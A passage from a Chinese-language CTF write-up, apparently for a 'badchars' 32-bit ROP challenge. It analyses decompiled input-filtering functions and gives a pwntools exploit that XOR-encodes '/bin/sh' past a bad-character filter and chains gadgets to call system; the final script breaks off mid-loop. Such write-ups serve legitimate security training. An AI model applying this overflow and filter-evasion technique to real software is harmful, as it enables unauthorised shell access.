  v0 <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  n <span class="token operator">=</span> <span class="token function">nstrlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">,</span> <span class="token number">0x200u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">checkBadchars</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> v0<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//存在漏洞 </span>
  <span class="token function">free</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>我们先看pwnme 函数都有哪些操作</p>
<p>接收到我们传入的字符串到v0</p>
<p>然后执行了一个nstrlen函数()传入长度为200字节</p>
<p>跟进分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">nstrlen</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-4h]</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
      <span class="token keyword">return</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> i<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487D8 v0<span class="token punctuation">:</span>                                     <span class="token punctuation">;</span> CODE XREF<span class="token punctuation">:</span> nstrlen<span class="token operator">+</span><span class="token number">38</span>↓j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487D8                 mov     edx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>arg_0<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487DB                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487DE                 add     eax<span class="token punctuation">,</span> edx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080487E0</span>                 movzx   eax<span class="token punctuation">,</span> byte ptr <span class="token punctuation">[</span>eax<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080487E3</span>                 cmp     al<span class="token punctuation">,</span> 0Ah
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080487E5</span>                 jnz     <span class="token keyword">short</span> loc_80487F0
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080487E7</span>                 add     <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487EB                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487EE                 jmp     <span class="token keyword">short</span> locret_80487FF
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F0 <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F0
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F0 loc_80487F0<span class="token punctuation">:</span>                            <span class="token punctuation">;</span> CODE XREF<span class="token punctuation">:</span> nstrlen<span class="token operator">+</span><span class="token number">23</span>↑j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F0                 add     <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F4
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F4 loc_80487F4<span class="token punctuation">:</span>                            <span class="token punctuation">;</span> CODE XREF<span class="token punctuation">:</span> nstrlen<span class="token operator">+</span><span class="token number">14</span>↑j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F4                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F7                 cmp     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>arg_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487FA                 jb      <span class="token keyword">short</span> v0
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487FC                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080487FF</span>
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data<span class="token operator">-</span>lang<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data<span class="token operator">-</span>trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data<span class="token operator">-</span>label_position<span class="token operator">=</span><span class="token string">"outer"</span> data<span class="token operator">-</span>labels_left<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_right<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
</code></pre>
<p>这段代码主要是在循环执行080487D8-到080487FA的内容 看到cmp这里的0xa </p>
<p>可以查询0x0a的相关信息，因为ebp+var_4的值一直在更新 所以这里的nstrlen函数应该就是在检测输入字符串的个数。</p>
<pre><code>0xA(十六进制数)=10(十进制数)
对应的字符为“控制字符”LF  (NL line feed, new line)：移行，换行。
&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;outer&quot; data-labels_left=&quot;&quot; data-labels_right=&quot;&quot; data-labels_copy=&quot;&quot;&gt;&lt;span class=&quot;code-caption-label&quot;&gt;&lt;/span&gt;&lt;/p&gt;
</code></pre><p>在执行完字符个数检测（nstrlen）之后又执行了checkBadchars 我们来跟进分析一下</p>
<pre class=" language-c"><code class="language-c">  v3 <span class="token operator">=</span> <span class="token string">'b'</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token string">'i'</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token string">'c'</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> <span class="token string">'f'</span><span class="token punctuation">;</span>
  v9 <span class="token operator">=</span> <span class="token string">'n'</span><span class="token punctuation">;</span>
  v10 <span class="token operator">=</span> <span class="token string">'s'</span><span class="token punctuation">;</span>
  j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> a2 <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">21</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>看到v3-v10就是函数检查的badchars 我们再通过汇编查看</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048847</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048847</span> loc_8048847<span class="token punctuation">:</span>                            <span class="token punctuation">;</span> CODE XREF<span class="token punctuation">:</span> checkBadchars<span class="token operator">+</span><span class="token number">75</span>↓j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048847</span>                 mov     edx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>arg_0<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804884A                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804884D                 add     eax<span class="token punctuation">,</span> edx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0804884F</span>                 movzx   edx<span class="token punctuation">,</span> byte ptr <span class="token punctuation">[</span>eax<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048852</span>                 lea     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_10<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048855</span>                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_8<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048858</span>                 add     eax<span class="token punctuation">,</span> ecx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804885A                 movzx   eax<span class="token punctuation">,</span> byte ptr <span class="token punctuation">[</span>eax<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804885D                 cmp     dl<span class="token punctuation">,</span> al
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0804885F</span>                 jnz     <span class="token keyword">short</span> loc_804886E
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048861</span>                 mov     edx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>arg_0<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048864</span>                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048867</span>                 add     eax<span class="token punctuation">,</span> edx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048869</span>                 mov     byte ptr <span class="token punctuation">[</span>eax<span class="token punctuation">]</span><span class="token punctuation">,</span> 0EBh
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804886C                 jmp     <span class="token keyword">short</span> loc_8048878
</code></pre>
<p>这里循环对输入的字符又进行了比较 如果出现上述字符串就会替换该字符串为0xEB </p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为题目和之前write4题目类似 所以这里从rop构造开始讲起</p>
<p>可是题目又对输入的字符进行检查了 我们现在想要的是/bin/sh 可是check函数中过滤了 b i n / s所以不能直接传入/bin/sh  不过题目中给了这样的提示</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">text<span class="token punctuation">:</span><span class="token number">08048890</span>                 public usefulGadgets
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048890</span> usefulGadgets<span class="token punctuation">:</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048890</span>                 xor     <span class="token punctuation">[</span>ebx<span class="token punctuation">]</span><span class="token punctuation">,</span> cl
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048892</span>                 retn
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048893</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048893</span>                 mov     <span class="token punctuation">[</span>edi<span class="token punctuation">]</span><span class="token punctuation">,</span> esi
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048895</span>                 retn
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048896</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048896</span>                 pop     ebx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048897</span>                 pop     ecx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048898</span>                 retn
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048899</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048899</span>                 pop     esi
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804889A                 pop     edi
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804889B                 retn
</code></pre>
<p>usefulGadgets 这里给了你xor提示， 既然有了这个gadget，我们可以利用先对/bin/sh进行xor加密来通过check ，然后通过usefulGadgets 来进行解密 接着调用即可</p>
<h4 id="ROP构造"><a href="#ROP构造" class="headerlink" title="ROP构造"></a>ROP构造</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">mov_ret <span class="token operator">=</span> <span class="token number">0x08048893</span> <span class="token comment" spellcheck="true"># mov dword ptr [edi], esi ; ret</span>

pop_esi_edi <span class="token operator">=</span> <span class="token number">0x08048899</span> <span class="token comment" spellcheck="true"># pop esi ; pop edi ; ret</span>

pop_ebx_ecx<span class="token operator">=</span><span class="token number">0x08048896</span> <span class="token comment" spellcheck="true">#pop ebx ; pop ecx ; ret</span>
xor_ebx<span class="token operator">=</span><span class="token number">0x08048890</span> <span class="token comment" spellcheck="true">#xor byte ptr [ebx], cl ; ret</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_esi_edi<span class="token punctuation">)</span><span class="token operator">+</span>binsh<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_esi_edi<span class="token punctuation">)</span> <span class="token operator">+</span> binsh<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

<span class="token operator">//</span>解密操作
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx_ecx<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span>i<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_byte<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_ebx<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
</code></pre>
<p>覆盖偏移到ret+覆盖ret为pop_esi_edi+写入binsh中的前四字节(加密后的/bin)到esi 因为32位程序寄存器最大只能存4字节+写入bss段地址到edi+将esi内容写到edi中 mov_ret</p>
<p>覆盖ret为pop_esi_edi+写入binsh中的后四字节(加密后的/sh\x00)到esi+写入bss段+4地址到edi(因为前4字节写入了/bin)+写入bss段+4地址到edi+将esi内容写到edi中 mov_ret</p>
<p>解密操作 下面有解释</p>
<p>写入system_plt+构造任意返回地址+当前解密(/bin/sh)过后的bss段地址</p>
<h4 id="xor加解密操作"><a href="#xor加解密操作" class="headerlink" title="xor加解密操作"></a>xor加解密操作</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">xor加密操作
badchars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x2F</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">]</span>
xor_byte <span class="token operator">=</span> <span class="token number">0x1</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    binsh <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">:</span>
        c <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> xor_byte
        <span class="token keyword">if</span> c <span class="token keyword">in</span> badchars<span class="token punctuation">:</span>
            xor_byte <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            binsh <span class="token operator">+=</span> chr<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
xor解密操作
pop_ebx_ecx<span class="token operator">=</span><span class="token number">0x08048896</span> <span class="token comment" spellcheck="true">#pop ebx ; pop ecx ; ret</span>
xor_ebx<span class="token operator">=</span><span class="token number">0x08048890</span> <span class="token comment" spellcheck="true">#xor byte ptr [ebx], cl ; ret</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx_ecx<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span>i<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_byte<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_ebx<span class="token punctuation">)</span>
</code></pre>
<p>解密操作：当我们利用rop将加密过得/bin/sh写入到bss段之后 逐个进行解密</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'badchars32'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'badchars32'</span><span class="token punctuation">)</span>
badchars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x2F</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">]</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
xor_byte <span class="token operator">=</span> <span class="token number">0x1</span>
system_plt <span class="token operator">=</span> <span class="token number">0x080484E0</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    binsh <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">:</span>
        c <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> xor_byte
        <span class="token keyword">if</span> c <span class="token keyword">in</span> badchars<span class="token punctuation">:</span>
            xor_byte <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            binsh <span class="token operator">+=</span> chr<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>


mov_ret <span class="token operator">=</span> <span class="token number">0x08048893</span> <span class="token comment" spellcheck="true"># mov dword ptr [edi], esi ; ret</span>

pop_esi_edi <span class="token operator">=</span> <span class="token number">0x08048899</span> <span class="token comment" spellcheck="true"># pop esi ; pop edi ; ret</span>

pop_ebx_ecx<span class="token operator">=</span><span class="token number">0x08048896</span> <span class="token comment" spellcheck="true">#pop ebx ; pop ecx ; ret</span>
xor_ebx<span class="token operator">=</span><span class="token number">0x08048890</span> <span class="token comment" spellcheck="true">#xor byte ptr [ebx], cl ; ret</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_esi_edi<span class="token punctuation">)</span><span class="token operator">+</span>binsh<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_esi_edi<span class="token punctuation">)</span> <span class="token operator">+</span> binsh<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
